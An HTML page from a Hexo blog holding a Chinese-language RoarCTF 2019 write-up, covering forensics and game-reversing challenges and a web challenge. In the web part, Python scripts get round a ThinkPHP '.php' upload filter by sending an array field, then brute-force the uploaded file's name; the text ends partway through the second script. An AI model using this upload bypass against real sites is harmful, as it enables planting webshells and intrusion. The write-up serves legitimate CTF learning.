@@ -1,0 +1,2133 @@
+<!DOCTYPE html>
+<html lang="en">
+    <!-- title -->
+
+
+
+
+<!-- keywords -->
+
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" >
+    <meta name="author" content="Qftm">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="Qftm">
+    
+    <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
+    
+    <meta name="description" content="">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+    <title>楼上请让路 RoarCTF2019 Writeup · Qftm&#39;s Blog</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href= "/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    <link rel="stylesheet" href= "/css/mobile.css?v=20180824" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href= "/assets/favicon.ico" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script" />
+    <link rel="preload" href="/scripts/main.js" as="script" />
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    
+    <!-- fancybox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >Qftm&#39;s Blog</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">楼上请让路 RoarCTF2019 Writeup</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href=/>Qftm's Blog</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style="
+
+
+
+
+
+
+
+height:50vh;
+">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            楼上请让路 RoarCTF2019 Writeup
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "CTF">CTF</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>Word count: <span class="post-count word-count">3.3k</span>Reading time: <span class="post-count reading-time">16 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2019/10/27</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h3><p>RoarCTF{签到！！！}</p>
+<h3 id="黄金六年"><a href="#黄金六年" class="headerlink" title="黄金六年"></a>黄金六年</h3><p><img src="/2019/10/27/RoarCTF2019-Writeup/20191015194517-426fdd2c-ef41-1.png" alt="1571137836097.png"></p>
+<p>文件尾部有一段base64，解码为16进制可以看到是一个压缩包</p>
+<p><img src="/2019/10/27/RoarCTF2019-Writeup/20191015194625-6a9835b0-ef41-1.png" alt></p>
+<p><img src="/2019/10/27/RoarCTF2019-Writeup/20191015194638-7282ba98-ef41-1.png" alt></p>
+<p>打开压缩包需要密码</p>
+<p><img src="/2019/10/27/RoarCTF2019-Writeup/20191015194651-7a9321fa-ef41-1.png" alt></p>
+<p>使用pr抽帧</p>
+<p><img src="/2019/10/27/RoarCTF2019-Writeup/20191015194702-80f52138-ef41-1.png" alt></p>
+<p><img src="/2019/10/27/RoarCTF2019-Writeup/20191015194714-883c94da-ef41-1.png" alt></p>
+<p><img src="/2019/10/27/RoarCTF2019-Writeup/20191015194724-8dbcb656-ef41-1.png" alt></p>
+<p><img src="/2019/10/27/RoarCTF2019-Writeup/20191015194731-9227c654-ef41-1.png" alt></p>
+<p>可以看到部分帧中有二维码，依次扫码即可得到key iwantplayctf</p>
+<p><img src="/2019/10/27/RoarCTF2019-Writeup/20191015194746-9b0d4726-ef41-1.png" alt></p>
+<h3 id="forensic"><a href="#forensic" class="headerlink" title="forensic"></a>forensic</h3><p>直接上volatility</p>
+<p><img src="/2019/10/27/RoarCTF2019-Writeup/20191015194804-a5debb6c-ef41-1.png" alt></p>
+<p>建议profile，直接用Win7SP1x86就可以。</p>
+<p>查看进程</p>
+<p>volatility -f mem.raw pslist –profile=Win7SP1x86</p>
+<p>可以看到存在以下几个值得注意的进程：</p>
+<p><img src="/2019/10/27/RoarCTF2019-Writeup/20191015194818-ade8a71e-ef41-1.png" alt></p>
+<p>Dumpit.exe 一款内存镜像提取工具。</p>
+<p>TrueCrypt.exe 一款磁盘加密工具。</p>
+<p>Notepad.exe windows自带的记事本。</p>
+<p>Mspaint,exe  windows自带画图工具。</p>
+<p>通过查看userassist可以发现notepad mspaint 在提取内存时在内存中并没有数据。查看用户Home目录的文件，可以发现有一个用户保存的图片文件</p>
+<p>volatility -f mem.raw –profile=Win7SP1x86 filescan|grep -v Temporary |grep -v .dll|grep -E ‘png|jpg|gif|zip|rar|7z|pdf’</p>
+<p><img src="/2019/10/27/RoarCTF2019-Writeup/20191015194847-bf20b080-ef41-1.png" alt></p>
+<p>把图片dump下来</p>
+<p><img src="/2019/10/27/RoarCTF2019-Writeup/20191015194909-cc79613c-ef41-1.png" alt></p>
+<p><img src="/2019/10/27/RoarCTF2019-Writeup/20191015195323-63d471de-ef42-1.png" alt></p>
+<p>通过查看桌面文件还可以发现dumpit.exe在桌面上，而dumpit.exe默认生成的文件是 {hash}.raw，默认保存路径是dumpit.exe所在的路径。</p>
+<p><img src="/2019/10/27/RoarCTF2019-Writeup/20191015194954-e713e67a-ef41-1.png" alt></p>
+<p><img src="/2019/10/27/RoarCTF2019-Writeup/20191015195005-edc9d632-ef41-1.png" alt></p>
+<p>尝试dump 位于0x000000001fca1130位置的raw镜像，发现该文件还没有数据，因此判断取证的时候dumpit.exe还在运行中，dump下来dumpit.exe的内存镜像。</p>
+<p><img src="/2019/10/27/RoarCTF2019-Writeup/20191015195039-022fa3e0-ef42-1.png" alt></p>
+<p>对dumpit.exe的内存镜像进行分析</p>
+<p><img src="/2019/10/27/RoarCTF2019-Writeup/20191015195107-12d2aa94-ef42-1.png" alt></p>
+<p><img src="/2019/10/27/RoarCTF2019-Writeup/20191015195127-1ecde674-ef42-1.png" alt></p>
+<p>猜测密码就是刚那张图片上的扭曲文字</p>
+<p><img src="/2019/10/27/RoarCTF2019-Writeup/20191015195349-736466c2-ef42-1.png" alt></p>
+<p>不得不说，有几个位置很难辨认，比如第一个字符是数字1还是字母l还是字母I,那些大小写长得一样的是大写还是小写，中间那个是y还是g。直接上掩码爆破</p>
+<p><img src="/2019/10/27/RoarCTF2019-Writeup/20191015195411-80bde1d6-ef42-1.png" alt></p>
+<p><img src="/2019/10/27/RoarCTF2019-Writeup/20191015195427-8a188376-ef42-1.png" alt></p>
+<p><img src="/2019/10/27/RoarCTF2019-Writeup/20191015195449-9744193e-ef42-1.png" alt></p>
+<h3 id="ThankGame"><a href="#ThankGame" class="headerlink" title="ThankGame"></a>ThankGame</h3><p>用dnspy反编译，关键代码：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">WinGame</span><span class="params">()</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (!winGame &amp;&amp; ((nDestroyNum == <span class="number">4</span>) || (nDestroyNum == <span class="number">5</span>)))</span><br><span class="line">      &#123;</span><br><span class="line">          string str = <span class="string">"clearlove9"</span>;</span><br><span class="line">          <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x15</span>; i++)</span><br><span class="line">          &#123;</span><br><span class="line">              <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">0x11</span>; j++)</span><br><span class="line">              &#123;</span><br><span class="line">                  str = str + MapState[i, j].ToString();</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span> (Sha1(str) == <span class="string">"3F649F708AAFA7A0A94138DC3022F6EA611E8D01"</span>)</span><br><span class="line">          &#123;</span><br><span class="line">              FlagText._instance.gameObject.SetActive(<span class="keyword">true</span>);</span><br><span class="line">              FlagText.str = <span class="string">"RoarCTF&#123;wm-"</span> + Md5(str) + <span class="string">"&#125;"</span>;</span><br><span class="line">              winGame = <span class="keyword">true</span>;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> string <span class="title">Md5</span><span class="params">(string str)</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="keyword">byte</span>[] bytes = Encoding.UTF8.GetBytes(str);</span><br><span class="line">      <span class="keyword">byte</span>[] buffer2 = MD5.Create().ComputeHash(bytes);</span><br><span class="line">      StringBuilder builder = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">      foreach (<span class="keyword">byte</span> num in buffer2)</span><br><span class="line">      &#123;</span><br><span class="line">          builder.Append(num.ToString(<span class="string">"X2"</span>));</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> builder.ToString().Substring(<span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">OnTriggerEnter2D</span><span class="params">(Collider2D collision)</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="keyword">int</span> x = (<span class="keyword">int</span>) collision.gameObject.transform.position.x;</span><br><span class="line">      <span class="keyword">int</span> y = (<span class="keyword">int</span>) collision.gameObject.transform.position.y;</span><br><span class="line">      <span class="keyword">switch</span> (collision.tag)</span><br><span class="line">      &#123;</span><br><span class="line">          <span class="keyword">case</span> <span class="string">"Tank"</span>:</span><br><span class="line">              <span class="keyword">if</span> (!<span class="keyword">this</span>.isPlayerBullect)</span><br><span class="line">              &#123;</span><br><span class="line">                  collision.SendMessage(<span class="string">"Die"</span>);</span><br><span class="line">                  UnityEngine.Object.Destroy(base.gameObject);</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">case</span> <span class="string">"Heart"</span>:</span><br><span class="line">              MapManager.MapState[x + <span class="number">10</span>, y + <span class="number">8</span>] = <span class="number">9</span>;</span><br><span class="line">              MapManager.nDestroyNum++;</span><br><span class="line">              collision.SendMessage(<span class="string">"Die"</span>);</span><br><span class="line">              UnityEngine.Object.Destroy(base.gameObject);</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">case</span> <span class="string">"Enemy"</span>:</span><br><span class="line">              <span class="keyword">if</span> (<span class="keyword">this</span>.isPlayerBullect)</span><br><span class="line">              &#123;</span><br><span class="line">                  collision.SendMessage(<span class="string">"Die"</span>);</span><br><span class="line">                  UnityEngine.Object.Destroy(base.gameObject);</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">case</span> <span class="string">"Wall"</span>:</span><br><span class="line">              MapManager.MapState[x + <span class="number">10</span>, y + <span class="number">8</span>] = <span class="number">8</span>;</span><br><span class="line">              MapManager.nDestroyNum++;</span><br><span class="line">              UnityEngine.Object.Destroy(collision.gameObject);</span><br><span class="line">              UnityEngine.Object.Destroy(base.gameObject);</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">case</span> <span class="string">"Barrier"</span>:</span><br><span class="line">              <span class="keyword">if</span> (<span class="keyword">this</span>.isPlayerBullect)</span><br><span class="line">              &#123;</span><br><span class="line">                  collision.SendMessage(<span class="string">"PlayAudio"</span>);</span><br><span class="line">              &#125;</span><br><span class="line">              UnityEngine.Object.Destroy(base.gameObject);</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+
+<p>墙1替换成8，老家0替换成9，66个变量，4或5个位置需要变，首先爆破66 * 65 * 64 * 63，爆破出来了，计算md5得到前10字节，得到flag，细节如图：</p>
+<p><img src="/2019/10/27/RoarCTF2019-Writeup/20191015195641-da354c68-ef42-1.png" alt></p>
+<p><img src="/2019/10/27/RoarCTF2019-Writeup/20191015195703-e759e804-ef42-1.png" alt></p>
+<p><img src="/2019/10/27/RoarCTF2019-Writeup/20191015195716-ee9cc29e-ef42-1.png" alt></p>
+<p><img src="/2019/10/27/RoarCTF2019-Writeup/20191015195723-f334b1f4-ef42-1.png" alt></p>
+<p><img src="/2019/10/27/RoarCTF2019-Writeup/20191015195734-f9529c90-ef42-1.png" alt></p>
+<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="simple-upload"><a href="#simple-upload" class="headerlink" title="simple_upload"></a>simple_upload</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Home</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Think</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">       show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">  &#125;</span><br><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">()</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">       $uploadFile = $_FILES[<span class="string">'file'</span>] ;</span><br><span class="line">       </span><br><span class="line">       <span class="keyword">if</span> (strstr(strtolower($uploadFile[<span class="string">'name'</span>]), <span class="string">".php"</span>) ) &#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">      &#125;</span><br><span class="line">       </span><br><span class="line">       $upload = <span class="keyword">new</span> \Think\Upload();<span class="comment">// 实例化上传类</span></span><br><span class="line">       $upload-&gt;maxSize  = <span class="number">4096</span> ;<span class="comment">// 设置附件上传大小</span></span><br><span class="line">       $upload-&gt;allowExts  = <span class="keyword">array</span>(<span class="string">'jpg'</span>, <span class="string">'gif'</span>, <span class="string">'png'</span>, <span class="string">'jpeg'</span>);<span class="comment">// 设置附件上传类型</span></span><br><span class="line">       $upload-&gt;rootPath = <span class="string">'./Public/Uploads/'</span>;<span class="comment">// 设置附件上传目录</span></span><br><span class="line">       $upload-&gt;savePath = <span class="string">''</span>;<span class="comment">// 设置附件上传子目录</span></span><br><span class="line">       $info = $upload-&gt;upload() ;</span><br><span class="line">       <span class="keyword">if</span>(!$info) &#123;<span class="comment">// 上传错误提示错误信息</span></span><br><span class="line">         <span class="keyword">$this</span>-&gt;error($upload-&gt;getError());</span><br><span class="line">         <span class="keyword">return</span>;</span><br><span class="line">      &#125;<span class="keyword">else</span>&#123;<span class="comment">// 上传成功 获取上传文件信息</span></span><br><span class="line">         $url = __ROOT__.substr($upload-&gt;rootPath,<span class="number">1</span>).$info[<span class="string">'file'</span>][<span class="string">'savepath'</span>].$info[<span class="string">'file'</span>][<span class="string">'savename'</span>] ;</span><br><span class="line">         <span class="keyword">echo</span> json_encode(<span class="keyword">array</span>(<span class="string">"url"</span>=&gt;$url,<span class="string">"success"</span>=&gt;<span class="number">1</span>));</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>ThinkPHP默认上传文件名是递增的。 代码中ThinkPHP的后缀过滤无效，所以通过上传多个文件的方式，绕过.php后缀的判断，但是这样拿不到上传的文件名，需要爆破。 具体的步骤为： </p>
+<p>1.写脚本上传一个正常文件，再上传多个文件，再上传一个正常文件。获取到第一三次上传的文件名。 </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://lo408dybroarctf.4hou.com.cn:34422/index.php/Home/Index/upload"</span></span><br><span class="line"></span><br><span class="line">files1 = &#123;<span class="string">'file'</span>: open(<span class="string">'ma.txt'</span>,<span class="string">'r'</span>)&#125;</span><br><span class="line">files2 = &#123;<span class="string">'file[]'</span>: open(<span class="string">'ma.php'</span>,<span class="string">'r'</span>)&#125;</span><br><span class="line"></span><br><span class="line">r = requests.post(url,files=files1)</span><br><span class="line">print(r.text)</span><br><span class="line"></span><br><span class="line">r = requests.post(url,files=files2)</span><br><span class="line">print(r.text)</span><br><span class="line"></span><br><span class="line">r = requests.post(url,files=files1)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>
+
+<p>2.多线程爆破一下第一三文件名之间的所有文件名。</p>
+<p> 这是最开始写的单线程爆破的脚本，后来觉得太累了，就拿开源扫描器dirfuzz改了一个多线程的版本。最终多线程爆破成功。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment">#&#123;"url":"\/Public\/Uploads\/2019-10-12\/5da1b52bb3645.txt","success":1&#125;</span></span><br><span class="line"><span class="comment">#&#123;"url":"\/Public\/Uploads\/","success":1&#125;</span></span><br><span class="line"><span 